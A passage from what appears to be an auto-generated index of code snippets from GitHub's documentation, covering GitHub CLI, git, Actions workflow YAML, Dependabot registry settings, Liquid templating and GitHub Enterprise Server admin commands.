CLI\nDESCRIPTION: This shell command uses the `gh gei migrate-org` command to initiate the migration of a GitHub organization. It requires specifying the source organization, the desired target organization name, and the target enterprise. The GitHub CLI must be installed and the environment variables `GH_PAT` and `GH_SOURCE_PAT` must be set.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-organizations-from-githubcom-to-github-enterprise-cloud.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ngh gei migrate-org --github-source-org SOURCE --github-target-org DESTINATION --github-target-enterprise ENTERPRISE\n```\n\n----------------------------------------\n\nTITLE: Searching models by input modality on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models that support text input using the `input-modality` qualifier. The search query filters models based on the specified input modality.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_5\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=input-modality:text&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Running bugged Factorial file on Mac/Linux\nDESCRIPTION: This shell command is used to execute the 'bugged_factorial_finder.py' Python script on a Mac or Linux system. It utilizes the 'python' command to invoke the Python interpreter and run the specified Python file.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/learning-to-debug-with-github-copilot.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\npython bugged_factorial_finder.py\n```\n\n----------------------------------------\n\nTITLE: Accessing the MySQL Console with ghe-dbconsole - Shell\nDESCRIPTION: This snippet shows how to use the `ghe-dbconsole` utility to open a MySQL database session on your GitHub Enterprise Server appliance. It is recommended to use this with support only and requires SSH access.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nghe-dbconsole\n```\n\n----------------------------------------\n\nTITLE: HTTPS Cloning Error Example\nDESCRIPTION: Illustrates a common HTTPS cloning error that might occur due to authentication issues or an outdated Git version. The error messages indicate problems accessing the repository's info/refs.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/troubleshooting-cloning-errors.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n> error: The requested URL returned error: 401 while accessing\n> https://{% data variables.product.product_url %}/USER/REPO.git/info/refs?service=git-receive-pack\n> fatal: HTTP request failed\n```\n\n----------------------------------------\n\nTITLE: JSONP Callback Handler (HTML/JavaScript)\nDESCRIPTION: This HTML snippet includes JavaScript code to handle a JSONP callback. It dynamically creates a script tag to request data from the GitHub REST API with a specified callback function (`foo`). The `foo` function processes the response and logs the `meta` and `data` properties to the browser's console.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/using-cors-and-jsonp-to-make-cross-origin-requests.md#_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<html>\n<head>\n<script type=\"text/javascript\">\nfunction foo(response) {\n  var meta = response.meta;\n  var data = response.data;\n  console.log(meta);\n  console.log(data);\n}\n\nvar script = document.createElement('script');\nscript.src = '{% data variables.product.rest_url %}?callback=foo';\n\ndocument.getElementsByTagName('head')[0].appendChild(script);\n</script>\n</head>\n\n<body>\n  <p>Open up your browser's console.</p>\n</body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Updating Remote Repository URL with Git\nDESCRIPTION: This snippet demonstrates how to update the remote repository URL for a local Git clone using the `git remote set-url` command. This is important after a repository has been transferred to a new owner or location. The `origin` parameter refers to the default remote name.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/transferring-a-repository.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit remote set-url origin NEW_URL\n```\n\n----------------------------------------\n\nTITLE: Running the sync-rest script with parameters in package.json\nDESCRIPTION: This command runs the `sync-rest` script defined in `package.json` with specific arguments. The `-s` argument specifies the source directory, and the `-o` argument specifies the output directory.\nSOURCE: https://github.com/github/docs/blob/main/src/webhooks/README.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm run sync-rest -- -s rest-api-description -o webhooks\n```\n\n----------------------------------------\n\nTITLE: Changing node adminaction state to none using nes set-node-adminaction\nDESCRIPTION: This snippet shows how to change the `adminaction` state of a node to `none` using the `nes set-node-adminaction` command. Replace HOSTNAME with the hostname of the node.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\nnes set-node-adminaction none HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Checking Background Upgrade Jobs (Shell)\nDESCRIPTION: Executes the `ghe-check-background-upgrade-jobs` utility to display the status of background jobs during a feature release upgrade.  This command requires no arguments and outputs the status of background jobs to the console.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_97\n\nLANGUAGE: shell\nCODE:\n```\nghe-check-background-upgrade-jobs\n```\n\n----------------------------------------\n\nTITLE: Jinja2 HTML Template\nDESCRIPTION: This HTML template uses Jinja2 syntax to render dynamic content. It includes placeholders for the page title, navigation menu, and page content, which are passed from the Flask application. It also defines the basic structure of the website, including the header, article, and footer.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/using-copilot-to-migrate-a-project.md#_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n{% raw %}\n<!DOCTYPE html>\n<html>\n<head>\n   <meta charset=\"utf-8\" />\n   <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"/>\n   <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"/>\n   <title>{{ page_title }} | {{ get_config('name') }}</title>\n   <link href=\"{{ get_config('site_url') }}/template/style.css\" rel=\"stylesheet\" type=\"text/css\" />\n</head>\n<body>\n<div class=\"wrap\">\n\n   <header>\n      <h1>{{ get_config('name') }}</h1>\n      <nav class=\"menu\">\n         {{ nav_menu|safe }}\n      </nav>\n   </header>\n\n   <article>\n      <h2>{{ page_title }}</h2>\n      {{ page_content|safe }}\n   </article>\n\n   <footer>\n      <small>&copy;{{ get_config('version') }} {{ get_config('name') }}.<br>{{ get_config('version') }}</small>\n   </footer>\n\n</div>\n</body>\n</html>\n{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Re-running failed jobs with gh CLI\nDESCRIPTION: This snippet demonstrates how to re-run failed jobs in a workflow run using the `gh run rerun` subcommand with the `--failed` flag. `RUN_ID` should be replaced with the ID of the run for which to re-run failed jobs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh run rerun RUN_ID --failed\n```\n\n----------------------------------------\n\nTITLE: Stopping Runner Service - macOS\nDESCRIPTION: Stops the self-hosted runner service on macOS systems using `svc.sh`. Requires the user to be in the directory where the runner application is installed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/configuring-the-self-hosted-runner-application-as-a-service.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\n./svc.sh stop\n```\n\n----------------------------------------\n\nTITLE: Configuring Docker with AWS credentials\nDESCRIPTION: This snippet shows how to configure Dependabot to authenticate with a private Amazon ECR registry using static AWS credentials in the `dependabot.yml` file. The registry type, URL, AWS access key ID, and AWS secret access key (stored as secrets) are specified.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  ecr-docker:\n    type: docker-registry\n    url: https://1234567890.dkr.ecr.us-east-1.amazonaws.com\n    username: ${{secrets.ECR_AWS_ACCESS_KEY_ID}}\n    password: ${{secrets.ECR_AWS_SECRET_ACCESS_KEY}}\n```\n\n----------------------------------------\n\nTITLE: Middleware for Handling Redirects\nDESCRIPTION: This snippet shows the location of the middleware that handles redirects for translated pages. It removes the language code from the URL, resolves the redirect based on the English content, and then injects the language code back into the URL.\nSOURCE: https://github.com/github/docs/blob/main/src/languages/README.md#_snippet_4\n\nLANGUAGE: TypeScript\nCODE:\n```\nsrc/redirects/middleware/handle-redirects.ts\n```\n\n----------------------------------------\n\nTITLE: CodeQL Configuration Using GitHub Actions Variable - YAML\nDESCRIPTION: This YAML snippet shows how to use a GitHub Actions variable to provide CodeQL configuration. `vars.CODEQL_CONF` is a variable that contains the contents of any valid configuration file.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_21\n\nLANGUAGE: yaml\nCODE:\n```\n- uses: {% data reusables.actions.action-codeql-action-init %}\n  with:\n    languages: {% raw %}${{ matrix.language }}{% endraw %}\n    config: {% raw %}${{ vars.CODEQL_CONF }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Setting npm registry via command line\nDESCRIPTION: This snippet demonstrates how to configure the npm registry using the `npm config set registry` command. Replace `<url>` with the actual URL of the private registry.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\nnpm config set registry <url>\n```\n\n----------------------------------------\n\nTITLE: Combined conditional rendering with NOT and AND\nDESCRIPTION: This snippet checks if the version is NOT FPT AND GHES is greater than the first deprecated version, and renders 'condition-o' if both conditions are true.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/ifversion.md#_snippet_11\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion not fpt and ghes > __GHES_DEPRECATED__[0] %}\ncondition-o\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Tool Tag: JetBrains\nDESCRIPTION: This code snippet demonstrates how to use the `jetbrains` tag to display content relevant to users of JetBrains IDEs. It wraps instructions specific to JetBrains IDEs.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_17\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% jetbrains %}\n\nThese instructions are pertinent to users of JetBrains IDEs.\n\n{% endjetbrains %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Cloning a Fork with Git\nDESCRIPTION: Creates a bare clone of the specified fork repository using `git clone --bare`. This downloads all the repository data without creating a working directory, which is useful for mirroring or creating a backup.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/detaching-a-fork.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit clone --bare https://{% data variables.product.product_url %}/EXAMPLE-USER/FORK.git\n```\n\n----------------------------------------\n\nTITLE: Forecasting GitHub Actions usage\nDESCRIPTION: Forecasts potential {% data variables.product.prodname_actions %} usage by computing metrics from completed pipeline runs in Azure DevOps, generating a forecast report in the specified output directory.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer forecast azure-devops --output-dir tmp/forecast_reports\n```\n\n----------------------------------------\n\nTITLE: Viewing workflow run logs using the GitHub CLI\nDESCRIPTION: These commands demonstrate how to view workflow run logs using the GitHub CLI (`gh`). It shows how to view logs for a specific run or job, and how to search the logs using `grep`. It also shows how to filter logs to only show failed steps.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngh run view RUN_ID --log\n```\n\nLANGUAGE: Shell\nCODE:\n```\ngh run view --job JOB_ID --log\n```\n\nLANGUAGE: Shell\nCODE:\n```\ngh run view --job JOB_ID --log | grep error\n```\n\nLANGUAGE: Shell\nCODE:\n```\ngh run view --job JOB_ID --log-failed\n```\n\n----------------------------------------\n\nTITLE: Running a Node.js file\nDESCRIPTION: This command executes a Node.js file. Replace `FILE_NAME` with the name of your JavaScript file containing the webhook handler code. The script must have been saved and be accessible in the current directory.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/handling-webhook-deliveries.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\nnode FILE_NAME\n```\n\n----------------------------------------\n\nTITLE: Example update command output\nDESCRIPTION: This snippet demonstrates the expected output after running the `gh actions-importer update` command, indicating that the container image is up-to-date.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nUpdating ghcr.io/actions-importer/cli:latest...\nghcr.io/actions-importer/cli:latest up-to-date\n```\n\n----------------------------------------\n\nTITLE: Writing a Vault Policy (Shell)\nDESCRIPTION: This command creates a read-only policy in HashiCorp Vault that allows access to secrets under the `secret/data/production/*` path. This policy restricts access to specific secrets.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nvault policy write myproject-production - <<EOF\n# Read-only permission on 'secret/data/production/*' path\n\npath \"secret/data/production/*\" {\n  capabilities = [ \"read\" ]\n}\nEOF\n```\n\n----------------------------------------\n\nTITLE: Checking Manager Pod Status with Kubectl\nDESCRIPTION: This code snippet shows how to check the status of the manager pod using `kubectl`. It retrieves pods in the `arc-systems` namespace to verify that the ARC controller is running.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller.md#_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nkubectl get pods -n arc-systems\n```\n\n----------------------------------------\n\nTITLE: Example Repository File Structure\nDESCRIPTION: Illustrates the directory structure for a GitHub repository including the location of the workflow file and a local action.  It shows the `.github/workflows` directory for the workflow and the `.github/actions/hello-world-action` for a custom action.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflows/section-referencing-an-action-from-the-same-repository.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n|-- hello-world (repository)\n|   |__ .github\n|       └── workflows\n|           └── my-first-workflow.yml\n|       └── actions\n|           |__ hello-world-action\n|               └── action.yml\n```\n\n----------------------------------------\n\nTITLE: Set Default Cache Policy\nDESCRIPTION: This command sets a default cache policy to replicate a single copy of every repository network to repository caches in the specified location (kansas). It uses the `ghe-spokesctl cache-policy set` command with the `--default` flag.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/caching-repositories/configuring-a-repository-cache.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nghe-spokesctl cache-policy set --default 1 kansas\n```\n\n----------------------------------------\n\nTITLE: Using Bash shell with Secrets in GitHub Actions\nDESCRIPTION: This YAML snippet demonstrates how to use secrets in Bash within a GitHub Actions workflow. It sets a secret as an environment variable and uses it in a Bash command, quoting the variable for safety.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - shell: bash\n    env:\n      SUPER_SECRET: ${{ secrets.SuperSecret }}\n    run: |\n      example-command \"$SUPER_SECRET\"\n```\n\n----------------------------------------\n\nTITLE: Configure Google Cloud Storage\nDESCRIPTION: This command configures Google Cloud Storage as the storage provider for GitHub Actions. It uses the `ghe-config` tool to set the `secrets.actions.storage.blob-provider` configuration to \"gcs\". This command requires the `ghe-config` tool to be available in the environment.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/configure-storage-provider-platform-commands.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config secrets.actions.storage.blob-provider \"gcs\"\n```\n\n----------------------------------------\n\nTITLE: Running Vitest Tests with Fixture Root\nDESCRIPTION: This command executes Vitest tests against fixture content. It sets the ROOT environment variable to specify the directory containing the fixture data. This is essential for testing functionality with controlled content.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/README.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nROOT=src/fixtures/fixtures vitest src/fixtures/tests\n```\n\n----------------------------------------\n\nTITLE: Add Script to package.json\nDESCRIPTION: This JSON snippet adds a 'server' script to the `package.json` file to run the `app.js` file using Node.js. Replace `app.js` if your file has a different name.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-github-app-that-responds-to-webhook-events.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n   \"scripts\": {\n     \"server\": \"node app.js\"\n   }\n```\n\n----------------------------------------\n\nTITLE: Exporting PGP Key via Command Line\nDESCRIPTION: This command exports a PGP key in ASCII armored format using the specified key ID. The exported key can then be added to a user's profile to enable commit signature verification.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_site_admin_settings/add-key-to-web-flow-user.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngpg --armor --export KEY-ID\n```\n\n----------------------------------------\n\nTITLE: Workflow Concurrency - Cancel Same Workflow\nDESCRIPTION: This YAML snippet configures concurrency to only cancel in-progress runs of the same workflow. It uses `github.workflow` to include the workflow name in the concurrency group, preventing the cancellation of runs from other workflows in the same repository.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/actions-group-concurrency.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true\n```\n\n----------------------------------------\n\nTITLE: Running Codegen for Playwright\nDESCRIPTION: These commands first build and start the development server, then launch Playwright's codegen tool.  The codegen tool generates TypeScript code by observing user interactions in the browser.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/PLAYWRIGHT.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\nnpm run build && npm run start-for-playwright\n```\n\nLANGUAGE: shell\nCODE:\n```\nnpx playwright codegen\n```\n\n----------------------------------------\n\nTITLE: Disabling a Workflow using GitHub CLI\nDESCRIPTION: This snippet shows how to disable a GitHub workflow using the `gh workflow disable` command. Replace `WORKFLOW` with the name, ID, or filename of the workflow. If no workflow is specified, the CLI provides an interactive menu.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/disabling-and-enabling-a-workflow.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh workflow disable WORKFLOW\n```\n\n----------------------------------------\n\nTITLE: Searching models by license on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models that mention 'distribute' in their license using the `in:license` qualifier. The search query filters models based on the presence of the specified term in their license information.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_1\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=in:license+distribute&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Empty Event Handler Route - Ruby\nDESCRIPTION: The following code defines an empty event handler route using the Sinatra framework in Ruby. This provides the basic structure to handle POST requests to the '/event_handler' endpoint.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\n  post '/event_handler' do\n\n    # ADD EVENT HANDLING HERE #\n\n    200 # success status\n  end\n```\n\n----------------------------------------\n\nTITLE: SSH connection to staging instance\nDESCRIPTION: This command establishes an SSH connection to a staging instance. It connects to the specified HOSTNAME using the admin user and port 122. Ensure you have the correct HOSTNAME and SSH key configured for the admin user.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_installation/ssh-into-staging-instance.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Refreshing Certificates (update-ca-certificates)\nDESCRIPTION: This snippet refreshes the certificates and content that may be missing in the `/etc/ssl/certs` directory.  It uses the `update-ca-certificates` command with verbose and fresh options. Requires sudo privileges.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/troubleshooting-tls-errors.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nsudo update-ca-certificates --verbose --fresh\n```\n\n----------------------------------------\n\nTITLE: Updating GitHub Actions Importer\nDESCRIPTION: This snippet shows how to update the GitHub Actions Importer using the `gh actions-importer update` command. It ensures that the container image is updated to the latest version from the GitHub Container Registry.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer update\n```\n\n----------------------------------------\n\nTITLE: Trigger Workflow on Branch Protection Rule Change - YAML\nDESCRIPTION: This snippet configures a workflow to run when a branch protection rule is created or deleted in the repository. It specifies the `branch_protection_rule` event and the `created` and `deleted` activity types.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  branch_protection_rule:\n    types: [created, deleted]\n```\n\n----------------------------------------\n\nTITLE: Getting Cluster Health (nes get-cluster-health)\nDESCRIPTION: This command, part of the `nes` utility, retrieves the health status of all nodes in the cluster. It's used for monitoring the overall health and availability of the cluster.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_52\n\nLANGUAGE: shell\nCODE:\n```\nnes get-cluster-health\n```\n\n----------------------------------------\n\nTITLE: Installing Bundler (Shell)\nDESCRIPTION: This command installs the Bundler gem, which is a dependency manager for Ruby. Bundler helps manage and install the required gems (libraries) for the project.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-login-with-github-button-with-a-github-app.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngem install bundler\n```\n\n----------------------------------------\n\nTITLE: Viewing Assignment Information using GitHub CLI\nDESCRIPTION: This command displays detailed information for a specific assignment. It necessitates the GitHub CLI and the GitHub Classroom extension. The output includes assignment name, due date, and other relevant information displayed in the console.\nSOURCE: https://github.com/github/docs/blob/main/content/education/manage-coursework-with-github-classroom/teach-with-github-classroom/using-github-classroom-with-github-cli.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh classroom assignment\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering for Non-Enterprise - Liquid\nDESCRIPTION: This snippet uses Liquid templating to conditionally render text only for non-Enterprise versions. It checks if the `currentVersion` is 'free-pro-team@latest'. If true, the enclosed text is displayed.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/page-versioned-for-all-enterprise-releases.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% if currentVersion == 'free-pro-team@latest' %}\n\nThis text should only render on non-Enterprise\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Getting Node TTL (nes get-node-ttl)\nDESCRIPTION: This command retrieves the Time-To-Live (TTL) settings for nodes in the cluster. The `all` argument specifies that the TTL should be retrieved for all nodes.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_53\n\nLANGUAGE: shell\nCODE:\n```\nnes get-node-ttl all\n```\n\n----------------------------------------\n\nTITLE: Re-running a specific job with gh CLI\nDESCRIPTION: This snippet demonstrates how to re-run a specific job in a workflow run using the `gh run rerun` subcommand with the `--job` flag. `JOB_ID` should be replaced with the ID of the job to be re-run.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh run rerun --job JOB_ID\n```\n\n----------------------------------------\n\nTITLE: Redux Action Creator for Incrementing Counter\nDESCRIPTION: This code defines a Redux action creator named `increment`. This action creator returns an object with the type 'INCREMENT', which is used by the reducer to update the state.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/decoupling-business-logic-from-ui-components.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nexport const increment = () => ({\n  type: 'INCREMENT'\n});\n```\n\n----------------------------------------\n\nTITLE: Installing GitHub GEI CLI Extension\nDESCRIPTION: This command installs the GitHub Enterprise Importer (GEI) CLI extension. It uses the `gh extension install` command from the GitHub CLI to install the `github/gh-gei` extension.  This requires the GitHub CLI (`gh`) to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/install-gei-extension.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh extension install github/gh-gei\n```\n\n----------------------------------------\n\nTITLE: Example `inputs` context JSON\nDESCRIPTION: This JSON snippet showcases an example of the `inputs` context. The context contains input properties passed to a workflow, such as `build_id`, `deploy_target`, and `perform_deploy`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_22\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"build_id\": 123456768,\n  \"deploy_target\": \"deployment_sys_1a\",\n  \"perform_deploy\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Conditional Table Row Inclusion\nDESCRIPTION: Demonstrates embedding a conditional block inside a table row definition. The purpose is to show/hide the table data for Cargo and Rust conditionally depending on the volvo version.\nSOURCE: https://github.com/github/docs/blob/main/src/content-linter/tests/fixtures/tables.md#_snippet_3\n\nLANGUAGE: Markdown\nCODE:\n```\n| Package manager | Languages | Recommended formats | All supported formats |\n| --- | --- | --- | ---|\n{%- ifversion volvo %}\n| Cargo | Rust | `Cargo.lock` | `Cargo.toml`, `Cargo.lock` |\n{%- endif %}\n```\n\n----------------------------------------\n\nTITLE: Pushing Repository to Remote in Shell\nDESCRIPTION: This shell command pushes the local Git repository to the remote repository named `origin`, specifically the specified branch. The `-u` option sets the upstream branch for future operations.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/creating-a-github-pages-site-with-jekyll.md#_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\ngit push -u origin BRANCH\n```\n\n----------------------------------------\n\nTITLE: Searching models by input tokens range on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models with an input token limit between 15,000 and 20,000 using the `input-tokens` qualifier with the `..` operator.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_13\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=input-tokens:15000..20000&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Creating a .gitignore file using touch\nDESCRIPTION: This snippet creates a `.gitignore` file in the current directory using the `touch` command. The purpose is to create a file where Git ignore rules can be defined. The command creates an empty file.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/ignoring-files.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ntouch .gitignore\n```\n\n----------------------------------------\n\nTITLE: Disabling GitHub Connect GHE.com - Shell\nDESCRIPTION: This snippet disables the GitHub Enterprise Server instance's connection to GitHub Enterprise Cloud for GitHub Connect.  This is required to reenable connections to GitHub.com. It requires administrative SSH access to the GHE instance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-github-connect/enabling-github-connect-for-ghecom.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.github.github-connect-ghe-com-enabled false\n```\n\n----------------------------------------\n\nTITLE: Filtering by Parent Issue in Projects\nDESCRIPTION: This snippet shows how to filter issues in a GitHub Project based on their parent issue. The filter string requires the repository owner, repository name, and the issue number of the parent issue.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/understanding-fields/about-parent-issue-and-sub-issue-progress-fields.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nparent-issue:\"<OWNER>/<REPO>#<ISSUE NUMBER>\"\n```\n\n----------------------------------------\n\nTITLE: Conditional execution of pre action using pre-if in YAML\nDESCRIPTION: This example configures a conditional execution of the `pre` action for a JavaScript action in YAML. It shows how to run the action only on linux-based runners using the `pre-if` condition.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\n  pre: 'cleanup.js'\n  pre-if: runner.os == 'linux'\n```\n\n----------------------------------------\n\nTITLE: Get User/Org Node ID with REST API using curl\nDESCRIPTION: This snippet demonstrates how to retrieve the Node ID of a GitHub user or organization using the REST API and `curl`. It requires replacing `GITHUB_OWNER` with the GitHub username. The API key should be provided as a token in the `Authorization` header.  `Accept` header specifies the API version.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_29\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request GET \\\n  --url https://api.github.com/users/GITHUB_OWNER \\\n  --header 'Authorization: token TOKEN' \\\n  --header 'Accept: application/vnd.github+json'\n```\n\n----------------------------------------\n\nTITLE: Preventing Link Transformation to 